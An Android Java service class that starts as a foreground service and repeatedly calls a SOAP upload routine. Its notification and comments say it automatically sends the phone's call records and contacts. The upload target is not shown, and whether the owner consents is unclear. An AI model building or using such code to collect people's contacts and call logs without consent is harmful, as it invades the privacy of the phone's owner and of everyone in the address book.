package com.example.tongxunluf.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;


import androidx.annotation.RequiresApi;

import com.example.tongxunluf.R;
import com.example.tongxunluf.receiver.AlarmReceive;
import com.example.tongxunluf.upload.Upload;


public class ResponseService extends Service {
    private final String TAG = "ResponseService";
    private final String CHANEL_ID_STRING = "service_01";
    public ResponseService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onCreate() {
        super.onCreate();
        NotificationManager notificationManager = (NotificationManager) this.getSystemService(Context.NOTIFICATION_SERVICE);
        NotificationChannel notificationChannel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notificationChannel = new NotificationChannel(CHANEL_ID_STRING,getString(R.string.app_name),NotificationManager.IMPORTANCE_LOW);
        }
        notificationManager.createNotificationChannel(notificationChannel);
        Notification notification = new Notification.Builder(getApplicationContext(),CHANEL_ID_STRING).setContentText("自动发送通话记录").build();
        startForeground(1,notification);
        Upload.sendBySoap();
        Log.i(TAG,"前端服务被开启了");
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        //这里上传通讯录
        Upload.sendBySoap();
        Log.e(TAG,"前端服务被调用了，哈哈."+ System.currentTimeMillis());
        return super.onStartCommand(intent, flags, startId);
    }
}
